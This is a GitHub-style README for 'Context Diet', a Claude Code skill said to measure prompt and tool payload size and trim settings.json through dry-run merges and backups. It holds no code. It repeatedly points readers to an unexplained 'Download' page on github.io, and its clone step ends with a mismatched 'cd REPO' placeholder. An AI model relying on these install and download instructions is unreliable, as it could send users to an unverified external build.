# Context Diet - Claude Code Optimization Skill 2026

> **Context Diet is a Claude Code agent skill for measuring system-prompt overhead, reviewing tool payload size, and reducing unused definitions through controlled `settings.json` configuration.**

[![Platform](https://img.shields.io/badge/Platform-Claude%20Code-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/reedmasonmxfw7441/context-diet-claude-code?style=flat-square)](https://github.com/reedmasonmxfw7441/context-diet-claude-code)

---

<p align="center">
  <a href="https://reedmasonmxfw7441.github.io/context-diet-claude-code/">
    <img src="https://img.shields.io/badge/Download-Context%20Diet%20Latest-brightgreen?style=for-the-badge" alt="Download Context Diet">
  </a>
</p>

> **[Download Context Diet](https://reedmasonmxfw7441.github.io/context-diet-claude-code/)**

---

[Download Latest Build](https://reedmasonmxfw7441.github.io/context-diet-claude-code/)

---

## What Context Diet Does

Context Diet helps Claude Code users find and reduce unnecessary system-prompt and tool-definition overhead. A logging proxy records payload sizes, making it easier to see which tools and features consume the most working context.

It is built for developers and teams that want to tune Claude Code deliberately. Rather than removing capabilities blindly, you can measure current usage, compare payload sizes, and then make focused changes to the configuration.

---

## Highlights

- Uses a logging proxy to quantify system-prompt overhead
- Sorts available tools according to payload size
- Exposes unused tool definitions and features
- Provides templates for conservative configuration changes
- Provides templates for aggressive configuration changes
- Performs deterministic merges into `settings.json`
- Saves backups before modifying configuration
- Offers global, project-level, and dry-run operation modes

---

## Getting Started

Clone the repository and enter its directory:

```bash
git clone https://github.com/reedmasonmxfw7441/context-diet-claude-code.git
cd REPO
```

Node.js must be available on the system. Before running the skill with Claude Code, inspect the included skill files and configuration templates.

For a first pass, use dry-run mode whenever it is available. The preview lets you examine proposed changes without immediately writing to a project or global settings file.

---

## Workflow

Context Diet is intended to be used in the following sequence:

1. Run the logging proxy and capture the existing prompt and tool payload information.
2. Examine the resulting tool-size ranking.
3. Determine which definitions or features are unnecessary for the project.
4. Choose either the conservative or aggressive configuration template.
5. Preview the merge with dry-run mode.
6. Apply the approved configuration at project or global scope.
7. Check the resulting `settings.json` and keep the created backup.

The process can be summarized as:

```text
Measure -> Rank payloads -> Review unused tools -> Preview changes -> Apply settings
```

Choose project mode for repository-specific behavior. Global mode is appropriate when the same configuration should be used across Claude Code projects.

---

## Settings and Modes

Context Diet operates on Claude Code `settings.json` files. Configuration merges are deterministic, and updates include backups so the previous state can be recovered and reviewed.

Available modes and templates include:

- **Conservative:** trims selected overhead while keeping a larger portion of optional functionality.
- **Aggressive:** removes a wider range of unused definitions or features.
- **Dry run:** shows the proposed merge without saving it.
- **Project scope:** writes configuration for the current project.
- **Global scope:** updates the global Claude Code configuration.

Always inspect generated changes before applying them, particularly when promoting a project-tested configuration to the global scope.

---

## Requirements

- Claude Code
- Node.js
- Access to the repository files
- A writable Claude Code `settings.json` location for applied changes
- Sufficient storage for configuration backups and local project files

Dry-run mode makes it possible to assess the skill without modifying existing settings.

---

## Frequently Asked Questions

### What users benefit from Context Diet?

Context Diet is intended for Claude Code users who need visibility into system-prompt overhead and want to adjust the available tool definitions and features.

### Will it modify settings without confirmation?

The skill creates deterministic merges and backups, but dry-run mode should be used first to inspect the proposed output before applying it.

### Which template should I choose?

Begin with the conservative option if retaining more functionality is important. Use the aggressive option only after measuring payloads and verifying that the removed capabilities are not required.

### Can I apply changes to a single project?

Yes. You can use project-level configuration instead of applying the changes globally.

### Where does the configuration go?

Context Diet works with Claude Code `settings.json`. Its precise location is determined by whether project mode or global mode is selected.

### What should I do if a change causes problems?

Run the operation again in dry-run mode, inspect the proposed merge, compare it against the backup, and confirm that the intended scope was project-level or global.

### Where can I get newer builds?

Look for updated skill files and newer builds in the repository:

[Download Latest Build](https://reedmasonmxfw7441.github.io/context-diet-claude-code/)

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
